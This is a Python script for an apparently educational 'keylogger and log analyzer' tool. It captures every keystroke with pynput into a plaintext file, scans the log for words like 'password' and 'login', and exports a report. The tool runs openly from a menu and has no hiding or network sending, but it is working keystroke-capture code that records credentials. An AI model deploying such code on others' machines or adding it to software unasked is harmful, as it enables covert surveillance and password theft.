import os
import time
from pynput import keyboard
from datetime import datetime
from tqdm import tqdm

log_file = "key_log.txt"
suspicious_keywords = ["admin", "root", "cmd", "hack", "password", "login"]

def start_keylogger():
    print("\n[✓] Keylogger started... (Press ESC to stop)\n")
    with open(log_file, "a") as file:
        file.write(f"\n\n=== Logging started at {datetime.now()} ===\n")

    def on_press(key):
        try:
            with open(log_file, "a") as file:
                if hasattr(key, 'char') and key.char is not None:
                    file.write(f"{key.char}")
                elif key == keyboard.Key.space:
                    file.write(" ")
                elif key == keyboard.Key.enter:
                    file.write("\n")
                else:
                    file.write(f"[{key.name}]")
        except Exception as e:
            print(f"Error: {e}")

    def on_release(key):
        if key == keyboard.Key.esc:
            return False

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def analyze_logs():
    if not os.path.exists(log_file):
        print("[-] No log file found.")
        return

    print("\n🔍 Analyzing keystroke log...\n")
    suspicious_count = 0
    with open(log_file, "r") as file:
        data = file.read().lower()
        for word in tqdm(suspicious_keywords, desc="Checking for suspicious keywords"):
            if word in data:
                print(f"[!] Suspicious keyword detected: '{word}'")
                suspicious_count += 1

    if suspicious_count == 0:
        print("\n[✓] No suspicious activity detected.")
    else:
        print(f"\n[✓] {suspicious_count} suspicious items found in the log.")

def export_report():
    if not os.path.exists(log_file):
        print("[-] No log file to export.")
        return

    report_file = "suspicious_report.txt"
    with open(log_file, "r") as src, open(report_file, "w") as dest:
        dest.write(f"Suspicious Activity Report - {datetime.now()}\n\n")
        dest.write(src.read())

    print(f"[✓] Report exported to '{report_file}'.")

def main():
    while True:
        print("\n====== KEYLOGGER & LOG ANALYZER TOOL ======")
        print("1. Start Keylogger")
        print("2. Analyze Logs")
        print("3. Export Report")
        print("4. Exit")

        choice = input("Enter your choice (1-4): ").strip()
        if choice == "1":
            start_keylogger()
        elif choice == "2":
            analyze_logs()
        elif choice == "3":
            export_report()
        elif choice == "4":
            print("Exiting tool. Stay ethical!")
            break
        else:
            print("Invalid choice. Please select 1 to 4.")

if __name__ == "__main__":
    main()
